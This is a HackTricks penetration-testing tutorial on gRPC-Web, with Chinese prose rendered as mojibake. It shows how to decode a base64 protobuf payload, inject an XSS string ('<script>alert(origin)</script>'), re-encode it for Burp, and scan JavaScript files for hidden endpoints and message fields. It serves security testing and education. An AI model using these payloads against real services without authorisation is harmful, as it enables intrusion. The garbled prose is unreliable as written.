# Pentesting gRPC-Web

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **æ“çºµ gRPC-Web è´Ÿè½½**
gRPC-Web åœ¨è¯·æ±‚ä¸­ä½¿ç”¨ Content-Type: `application/grpc-web-text`ï¼Œè¿™æ˜¯ä¸€ç§ä»¥ base64 ç¼–ç å½¢å¼çš„ protobufï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ [gprc-coder](https://github.com/nxenon/grpc-pentest-suite) å·¥å…·ï¼Œä¹Ÿå¯ä»¥å®‰è£…å…¶ [Burp Suite æ‰©å±•](https://github.com/nxenon/grpc-pentest-suite)ã€‚

### **ä½¿ç”¨ gGRPC Coder å·¥å…·æ‰‹åŠ¨æ“ä½œ**
1. é¦–å…ˆè§£ç è´Ÿè½½ï¼š
```bash
echo "AAAAABYSC0FtaW4gTmFzaXJpGDY6BVhlbm9u" | python3 grpc-coder.py --decode --type grpc-web-text | protoscope > out.txt
```
2. ç¼–è¾‘è§£ç è´Ÿè½½çš„å†…å®¹
```
nano out.txt
2: {"Amin Nasiri Xenon GRPC"}
3: 54
7: {"<script>alert(origin)</script>"}
```
3. ç¼–ç æ–°çš„æœ‰æ•ˆè´Ÿè½½
```bash
protoscope -s out.txt | python3 grpc-coder.py --encode --type grpc-web-text
```
4. åœ¨Burpæ‹¦æˆªå™¨ä¸­ä½¿ç”¨è¾“å‡ºï¼š
```
AAAAADoSFkFtaW4gTmFzaXJpIFhlbm9uIEdSUEMYNjoePHNjcmlwdD5hbGVydChvcmlnaW4pPC9zY3JpcHQ+
```
### **ä½¿ç”¨ gRPC-Web Coder Burp Suite æ‰©å±•çš„æ‰‹å†Œ**
æ‚¨å¯ä»¥åœ¨ [gRPC-Web Pentest Suite](https://github.com/nxenon/grpc-pentest-suite) ä¸­ä½¿ç”¨ gRPC-Web Coder Burp Suite æ‰©å±•ï¼Œè¿™æ ·æ›´ç®€å•ã€‚æ‚¨å¯ä»¥åœ¨å…¶ä»“åº“ä¸­é˜…è¯»å®‰è£…å’Œä½¿ç”¨è¯´æ˜ã€‚

## **åˆ†æ gRPC-Web Javascript æ–‡ä»¶**
æ¯ä¸ª gRPC-Web åº”ç”¨ç¨‹åºä¸­è‡³å°‘æœ‰ä¸€ä¸ª Javascript æ–‡ä»¶ã€‚æ‚¨å¯ä»¥åˆ†æè¯¥æ–‡ä»¶ä»¥æŸ¥æ‰¾æ–°çš„æ¶ˆæ¯ã€ç«¯ç‚¹å’ŒæœåŠ¡ã€‚å°è¯•ä½¿ç”¨ [gRPC-Scan](https://github.com/nxenon/grpc-pentest-suite) å·¥å…·ã€‚
1. ä¸‹è½½ Javascript gRPC-Web æ–‡ä»¶
2. ä½¿ç”¨ grpc-scan.py æ‰«æå®ƒï¼š
```bash
python3 grpc-scan.py --file main.js
```
3. åˆ†æè¾“å‡ºå¹¶æµ‹è¯•æ–°çš„ç«¯ç‚¹å’Œæ–°æœåŠ¡ï¼š
```
Output:
Found Endpoints:
/grpc.gateway.testing.EchoService/Echo
/grpc.gateway.testing.EchoService/EchoAbort
/grpc.gateway.testing.EchoService/NoOp
/grpc.gateway.testing.EchoService/ServerStreamingEcho
/grpc.gateway.testing.EchoService/ServerStreamingEchoAbort

Found Messages:

grpc.gateway.testing.EchoRequest:
+------------+--------------------+--------------+
| Field Name |     Field Type     | Field Number |
+============+====================+==============+
| Message    | Proto3StringField  | 1            |
+------------+--------------------+--------------+
| Name       | Proto3StringField  | 2            |
+------------+--------------------+--------------+
| Age        | Proto3IntField     | 3            |
+------------+--------------------+--------------+
| IsAdmin    | Proto3BooleanField | 4            |
+------------+--------------------+--------------+
| Weight     | Proto3FloatField   | 5            |
+------------+--------------------+--------------+
| Test       | Proto3StringField  | 6            |
+------------+--------------------+--------------+
| Test2      | Proto3StringField  | 7            |
+------------+--------------------+--------------+
| Test3      | Proto3StringField  | 16           |
+------------+--------------------+--------------+
| Test4      | Proto3StringField  | 20           |
+------------+--------------------+--------------+

grpc.gateway.testing.EchoResponse:
+--------------+--------------------+--------------+
|  Field Name  |     Field Type     | Field Number |
+==============+====================+==============+
| Message      | Proto3StringField  | 1            |
+--------------+--------------------+--------------+
| Name         | Proto3StringField  | 2            |
+--------------+--------------------+--------------+
| Age          | Proto3IntField     | 3            |
+--------------+--------------------+--------------+
| IsAdmin      | Proto3BooleanField | 4            |
+--------------+--------------------+--------------+
| Weight       | Proto3FloatField   | 5            |
+--------------+--------------------+--------------+
| Test         | Proto3StringField  | 6            |
+--------------+--------------------+--------------+
| Test2        | Proto3StringField  | 7            |
+--------------+--------------------+--------------+
| Test3        | Proto3StringField  | 16           |
+--------------+--------------------+--------------+
| Test4        | Proto3StringField  | 20           |
+--------------+--------------------+--------------+
| MessageCount | Proto3IntField     | 8            |
+--------------+--------------------+--------------+

grpc.gateway.testing.ServerStreamingEchoRequest:
+-----------------+-------------------+--------------+
|   Field Name    |    Field Type     | Field Number |
+=================+===================+==============+
| Message         | Proto3StringField | 1            |
+-----------------+-------------------+--------------+
| MessageCount    | Proto3IntField    | 2            |
+-----------------+-------------------+--------------+
| MessageInterval | Proto3IntField    | 3            |
+-----------------+-------------------+--------------+

grpc.gateway.testing.ServerStreamingEchoResponse:
+------------+-------------------+--------------+
| Field Name |    Field Type     | Field Number |
+============+===================+==============+
| Message    | Proto3StringField | 1            |
+------------+-------------------+--------------+

grpc.gateway.testing.ClientStreamingEchoRequest:
+------------+-------------------+--------------+
| Field Name |    Field Type     | Field Number |
+============+===================+==============+
| Message    | Proto3StringField | 1            |
+------------+-------------------+--------------+

grpc.gateway.testing.ClientStreamingEchoResponse:
+--------------+----------------+--------------+
|  Field Name  |   Field Type   | Field Number |
+==============+================+==============+
| MessageCount | Proto3IntField | 1            |
+--------------+----------------+--------------+
```
## å‚è€ƒæ–‡çŒ®

* [Amin Nasiri çš„ gRPC-Web é»‘å®¢æ–‡ç« ](https://infosecwriteups.com/hacking-into-grpc-web-a54053757a45)
* [gRPC-Web æ¸—é€æµ‹è¯•å¥—ä»¶](https://github.com/nxenon/grpc-pentest-suite)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
